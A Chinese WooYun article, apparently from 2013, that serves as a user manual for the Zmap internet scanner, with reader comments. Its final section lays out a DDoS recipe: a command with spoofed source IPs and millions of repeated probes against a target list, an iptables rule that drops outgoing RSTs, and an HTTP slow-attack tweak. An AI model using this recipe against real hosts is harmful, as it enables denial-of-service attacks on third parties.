@@ -1,0 +1,101 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Zmap详细用户手册和DDOS的可行性</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">livers</a> <span class="bull">·</span> <time title="2013/08/23 11:52" ui-time="" datetime="2013/08/23 11:52" class="published ng-binding ng-isolate-scope">2013/08/23 11:52</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。</p><h3>安装：</h3><h4>64位版本</h4><p>Debian/Ubuntu 系列</p><pre><code>Step1: sudo apt-get install libgmp3-dev libpcap-dev gengetopt
+Step2: wget https://github.com/zmap/zmap/archive/v1.0.3.tar.gz
+Step3: tar –zxvf v1.0.3.tar.gz
+Step4: cd zmap-1.0.3/src
+Step5: make &amp;&amp; make install
+</code></pre><h4>32版本 （zmap 主页只说适用于64位linux,这里用BT5r3 32位同样安装成功,建议还是尽量选用64版本的）</h4><p>Debian/Ubuntu 系列</p><pre><code>Step1: sudo apt-get install libgmp3-dev libpcap-dev gengetopt
+Step2: git clone git://github.com/zmap/zmap.git
+Step3: tar –zxvf v1.0.2.tar.gz
+Step4: cd zmap-1.0.2/src
+Step5: make &amp;&amp; make install
+</code></pre><p>Fedora, Red Hat Enterprise Linux, or CentOS版本：</p><p>只把step2替换成</p><pre><code>sudo yum install gmp gmp-devel libpcap-devel gengetopt
+</code></pre><p>如果想使用 redis用来存储则需要首先安装 Hiredis，并在step5中</p><pre><code>make REDIS=true   (加入此安装选项)
+</code></pre><p>不是以root权限运行则需要配置：</p><pre><code>setcap cap_net_raw=ep /usr/local/sbin/zmap
+</code></pre><h2>0x01 使用介绍：</h2><hr><p>安装完后，可直接调用zmap</p><h3>1.最简单的调用</h3><pre><code>zmap -B 10M -p 80 -n 100000 -o results.txt
+</code></pre><p>-B 是指的是带宽 -p 端口 -n 扫描多少个目标 -o 输出结果</p><p>整句表示利用10M带宽扫描100000IP地址的端口，并将结果输出到results.txt中。</p><p>我BT5 R3 测试时，必须加入-G 参数</p><pre><code>zmap -B 10M -p 80 -n 100000 -G "01:00:5e:00:00:02" -o results.txt
+</code></pre><p>-G 是指定出口的mac地址，必须为网关的实际mac地址，否则返回数据找不到信息。</p><p>如果扫到IP地址开了80端口，就会按照下列格式进行保存。</p><pre><code>115.237.116.119
+23.9.117.80
+207.118.204.141
+217.120.143.111
+</code></pre><h3>2.用的最多的指令</h3><pre><code>zmap -p 443 -G "00:00:00:00:00:00"
+</code></pre><p>检测全网络SSL/STL使用状况，ZMAP几个研究项目都与此有关。 ￼ <img alt="enter image description here" img-src="3fb9621005acd5f2b223b375489178dcd0e0cc49.jpg"></p><p>可见我使用的扫描全网的所得大约9小时16分钟，网络为10MADSL带宽，ADSL上行速度只有100k左右，导致时间加倍延迟。</p><h3>3.常用参数</h3><pre><code>-p, --target-port=port
+</code></pre><p>指定扫描的目标端口</p><pre><code>-o, --output-file=name  
+</code></pre><p>把结果写入指定文件 -o result.txt</p><pre><code>-b, --blacklist-file=path  
+</code></pre><p>IP地址黑名单，例如192.168.0.0/16 表示 192.168.x.x将不被扫描，默认提供一份 RFC 1918保留和内网地址供参考，存放位置在<code>conf/blacklist.conf</code></p><pre><code>zmap -p 443 -G "00:00:00:00:00:00" -b  conf/blacklist.conf
+
+
+
+
+
+-n, --max-targets=n
+</code></pre><p>最大扫描IP地址数量，-n 100 表示总归扫描100个IP地址。也可指定 –n 0.1%形式，表示扫描除去黑名单列表里面全网段的0.1%数量的IP地址。</p><pre><code>-N, --max-results=n
+</code></pre><p>最大扫描到结果的IP数量，-N 100 表示扫描到100个存在的结果就停止。</p><pre><code>-t, --max-runtime=secs
+</code></pre><p>最大扫描时间，-t 10 表示程序运行10s结束。</p><pre><code>-r, --rate=pps
+</code></pre><p>设置每秒发送包的数量 –r 10000 表示每秒发送10k个包。</p><pre><code>-B, --bandwidth=bps
+</code></pre><p>设置每秒发送包的大小，-B 10M 表示每秒发送10Mbps 支持单位（GMK）。</p><pre><code>-c, --cooldown-time=secs
+</code></pre><p>设置数据包发送完之后多长时间开始接受数据（response）,默认8s，TCP连接异步接受。</p><pre><code>-e, --seed=n
+</code></pre><p>设置扫描随机地址的顺序，C语言中的伪随机种子，指定 定值每次随机扫描的IP地址顺序是一样。</p><pre><code>-T, --sender-threads=n
+</code></pre><p>设置扫描线程。默认是1，经测试单线程基本是把网络带宽充分利用。</p><pre><code>-P, --probes=n
+</code></pre><p>设置往每个IP发送包的数量，默认为1。（DDOS的参数之一）。</p><pre><code>-d, --dryrun
+</code></pre><p>打印出每个包的内容，非常实用的功能。</p><pre><code>-s, --source-port=port|range
+</code></pre><p>设置扫描的源端口，可指定范围 –s 30000-50000。（DDOS的参数之一）。</p><pre><code>-S, --source-ip=ip|range
+</code></pre><p>设置扫描的源IP地址，可指定范围-S 100.100.0.1-200.200.200.200（DDOS的参数之一）。</p><pre><code>-G, --gateway-mac=addr
+</code></pre><p>设置网关的mac地址，可伪造。（DDOS的参数之一）</p><pre><code>-M, --probe-module=name
+</code></pre><p>设置扫描模式，参数tcp&#95;synscan（默认），icmp&#95;echoscan（ping扫描），udp（测试速度要逊于前两个），这里可自定义自己的模块，ZMAP作者后续会增加例如自定义UDP payload 的选项。（`*udp&#95;send&#95;msg = "GET / HTTP/1.1</p><p>"; // Must be null-terminated`）源码里不可直接更改 （1.0.3版本加入UDP Data Probes可进行自定义）</p><pre><code>-O, --output-module=name
+</code></pre><p>设置结果输出模块，参数simple&#95;file（默认），extended&#95;file。</p><p>Simple_file 模式如下</p><pre><code>115.237.116.119
+23.9.117.80
+207.118.204.141
+217.120.143.111
+</code></pre><p>Extended File模式如下</p><pre><code>response, saddr, daddr, sport, dport, seq, ack, in_cooldown, is_repeat, timestamp
+synack, 159.174.153.144, 10.0.0.9, 80, 40555, 3050964427, 3515084203, 0, 0,2013-08-15 18:55:47.681
+</code></pre><p>扫描模块和输出模块都提供了API ，可自己根据需要添加功能。</p><pre><code>--quiet
+</code></pre><p>安静状态下运行，不把进度信息打印到屏幕上</p><pre><code>--summary
+</code></pre><p>输出结果汇总，对研究人员来说 非常有帮助。</p><h2>0x02 三个额外的扩展应用</h2><hr><h3>Banner Grab</h3><p>抓取指纹，简言之抓取response 为识别类似SSH，http 401之类的信息做准备。</p><p>这里 examples / banner-grab 目录下</p><p>首先 make 生成banner-grab-tcp</p><p>向http-req 文件写入要发送的数据 (也可以自定义SSH-req 之类)</p><p>如：</p><pre><code>echo -e -n "GET / HTTP/1.1
+Host: %s
+
+" &gt; http-req
+</code></pre><p>（%s 保留，其他可任意构造HTTP请求，包括GET，POST）</p><p>这里扩展下 banner-grab-tcp下的参数</p><pre><code>-c, --concurent   每次的连接数，最好低于1000，想要高于1000则必须设置ulimit -SSn 1000000` and `ulimit -SHn 1000000` 突破每个文件最大进程数1024
+-p, --port      连接的端口
+-t, --conn-timeout  连接超时时间
+-r, --read-timeout  响应超时时间
+-v, --verbosity     列取信息详细程度 ，与sqlmap 类似
+-f, --format        输出文件格式hex，ascii，base64
+-d, --data      发送的数据信息 就是前面设置http-req
+</code></pre><p>源码里 #define MAX&#95;BANNER&#95;LEN 1024 接收的每条返回数据，只接收1024字节，根据需要可自行更改。</p><h4>与zmap 联合使用</h4><p>例子</p><pre><code>zmap -p 80 -N 1000 -o - | ./banner-grab-tcp -p 80 -c 100 -d http-req &gt; http-banners.out
+</code></pre><p>zmap扫描1000个80端口开放的IP地址，banner-grab-tcp 来扫描这些IP地址，扫描请求内容通过http-req可自定义 .</p><h3>forge-socket</h3><p>与Banner Grab功能一样，参数也类似，不再重复。</p><p>主要是安装方式不同</p><p>要先安装下列驱动</p><pre><code>git clone <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e98e809da98e809d819c8bc78a8684">[email&#160;protected]</a>:ewust/forge_socket.git
+cd forge_socket
+make
+sudo insmod forge_socket.ko（以底层驱动方式 比Banner Grab效率高一些）
+</code></pre><p>并且用iptables阻止发rst包</p><pre><code>iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST,RST RST,RST -j DROP
+</code></pre><h3>UDP Data Probes</h3><p>1.03版本加入</p><p>详细的测试payload见</p><p><a href="https://github.com/zmap/zmap/tree/master/examples/udp-probes">https://github.com/zmap/zmap/tree/master/examples/udp-probes</a></p><p>以探测mssql的1434端口为例：</p><pre><code>zmap -M udp -p 1434 --probe-args=file:examples/udp-probes/mssql_1434.pkt
+</code></pre><p>pkt也可自行构造。</p><p>格式化配置</p><p>利用配置文件 简化命令行输入</p><pre><code>interface "eth1"
+source-ip 1.1.1.4-1.1.1.8
+gateway-mac b4:23:f9:28:fa:2d # upstream gateway
+cooldown-time 300 # seconds
+blacklist-file /etc/zmap/blacklist.conf
+output-file ~/zmap-output
+quiet
+summary
+</code></pre><p>上述指令上面全部有介绍。</p><p>很显然，可以通过配置文件更快速配置zmap.</p><p>使用方法：</p><pre><code>zmap --config=~/.zmap.conf --target-port=443
+</code></pre><h2>0x03 原理分析</h2><hr><p>Know it</p><p>首先讲下TCP三次握手。</p><p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。</p><p><img alt="enter image description here" img-src="8eebfd461921a3afe9acfe8ab1da4f7ad95e53d9.jpg"></p><p>可见三次握手存在于发送-应答-发送机制，等待监听的时间势必导致发包速度很慢。</p><p>这里zmap是发送SYN，随后发送RST（重置连接），不存在监听同步操作，清空连接，再继续发下一个数据包。 而对于识别 zmap把 Ip地址和端口做了类似hash表一样的映射，当数据包返回时（可能是Syn+Ack，也可能RST），取出返回数据包里Ip和端口地址进行储存的hash表里查询，并对应处理记录。 同步变异步高效的基本原因。</p><h2>0x04 发散扩展</h2><hr><p>DDoS的可行性：</p><p>作者旨在关注全网的扫描，并未提及相关DDoS 的信息。</p><p>也并未特别提供指向型发包的指令。</p><p>下面讨论可能与作者想法相违，希望各位重在技术钻研，而非一些恶意破坏。</p><p>指定ip段 和ip地址</p><pre><code>-w, --whitelist-file=path
+</code></pre><p>限制只扫描文件中的下列地址或者地址段，例如：</p><pre><code>222.222.221.82/24   （192.168.1.0-255 ）（可利用种子 –seed 调整从那个IP开始）
+</code></pre><p>单个Ip地址</p><pre><code>222.222.221.82/32  （随机找了一个，这里1.02版本测试不能直接，需要改 blacklist.c和constraint.c 中生成IP地址的二叉树的root节点一小部分代码）
+</code></pre><p>然后利用</p><pre><code>-P  10000000 （重复多次发包）
+-s  2000-60000 (设置一个大的端口段)
+-S  20.20.20.0-200.200.200.200（随机大量Ip地址，模拟分布式的D）
+-G  这个伪造mac （但是收不到数据包）
+
+
+
+
+
+Zmap –p 80 -P 10000000 -s 2000-60000 -S 20.20.20.0-200.200.200.200 -w attack_url.txt
+</code></pre><p>见下列发送的数据效果，达到预期</p><p><img alt="enter image description here" img-src="a2d1a618c38d08a372848785d537b834a5b524cb.jpg"></p><p>可能造成什么样的危害?</p><p>可以配置IP Spoofing，syn flood,land attack, ICMP floods, Application floods 和其他UDP 全零等多种攻击。</p><p>Zmap 的发包速度甚至可以忽略一下 随后发的这个rst 包。</p><p>也可以做得完美一点就是利用iptables</p><pre><code>iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST,RST RST,RST -j DROP
+</code></pre><p>把发出去的RST包给drop掉。</p><h4>可以再升一下？</h4><p>毕竟有部分扩展能控制到应用层也是可以进行慢攻击。</p><p>Get 类型</p><pre><code>echo -e -n "GET / HTTP/1.1
+Host: %s
+
+" &gt; http-req  替换成
+echo -e -n "GET / HTTP/1.1
+Host: %s
+ " &gt; http-req
+</code></pre><p>Post 类型</p><p>可以把源码sizeof(value) 的值设置一个大的动态数值。 Post数据设置很小。</p><h3>DDoS 流量 +连接数 +畸形包</h3><h3>流量基本只能硬防，拼硬件。</h3><h3>zmap几乎是最大限度利用网络带宽，10台G口服务器不会损耗多少，如果再利用DNS放大流量之类，很恐怖的数字。</h3><p>Ps ：</p><p>Zmap 某些方面和python 的scapy很像。</p><p>但zmap 纯C实现，比scapy效率要高一些。</p><p>以前老是纠结scapy 随后发送RST 问题，这里利用iptables 方式确实是个好方法。</p><p>参考其中的源码和相对规范的API接口，编写一些模块可以玩出很多花样。</p><p>LINK:</p><p><a href="https://zmap.io/documentation.html">https://zmap.io/documentation.html</a></p><p><a href="https://github.com/zmap/">https://github.com/zmap/</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2719" rel="bookmark" id="re1">从内存中窃取未加密的SSH-agent密钥</a></li><li><a href="http://drops.wooyun.org/tools/427" rel="bookmark" id="re2">InsightScan:Python多线程Ping/端口扫描 + HTTP服务/APP 探测，可生成Hydra用的IP列表</a></li><li><a href="http://drops.wooyun.org/tips/4715" rel="bookmark" id="re3">如何发现 NTP 放大攻击漏洞</a></li><li><a href="http://drops.wooyun.org/tools/601" rel="bookmark" id="re4">跑wordpress用户密码脚本</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">宇宙转啊转</span> <span class="reply-time">2016-03-16 10:28:55</span></div><p></p><p>没有examples/banner-grab啊<br>banner-grab还需要安装吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">邪恶魔法师</span> <span class="reply-time">2014-11-17 11:41:24</span></div><p></p><p>官方ubuutu安装方法<br>sudo apt-get install build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc<br>wget https://github.com/zmap/zmap/archive/v1.2.1.tar.gz<br>tar -zxvf v1.2.1.tar.gz<br>cd v1.2.1<br>cmake -DENABLE_DEVELOPMENT=OFF<br>make<br>make install</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">JJoo</span> <span class="reply-time">2014-05-02 19:31:14</span></div><p></p><p>强大！留个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SunnyJay</span> <span class="reply-time">2013-08-23 18:31:24</span></div><p></p><p>看起来很火啊~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-08-23 12:43:00</span></div><p></p><p>对的，发包和收包异步进行 速度杠杠的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-08-23 12:41:07</span></div><p></p><p>基本占满网速了，缺点是在于现成不太方便</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Jannock</span> <span class="reply-time">2013-08-23 12:39:44</span></div><p></p><p>zmap只管发包，所以目标越大回应的越多，他就越是快。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">liyang</span> <span class="reply-time">2013-08-23 12:37:47</span></div><p></p><p>今天安装的时候 最后make install要权限的</p><p>sudo make install</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-08-23 12:16:25</span></div><p></p><p>ddos部分貌似还是比不上专业的ddos工具</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">erevus</span> <span class="reply-time">2013-08-23 12:11:14</span></div><p></p><p>在公司不敢测，怕被搞死...回家玩</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">国士无双</span> <span class="reply-time">2013-08-23 11:54:49</span></div><p></p><p>先去吃饭...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2013-08-23 11:53:35</span></div><p></p><p>吃完饭再回来看。</p><p></p></div></div></div></div></div></main>
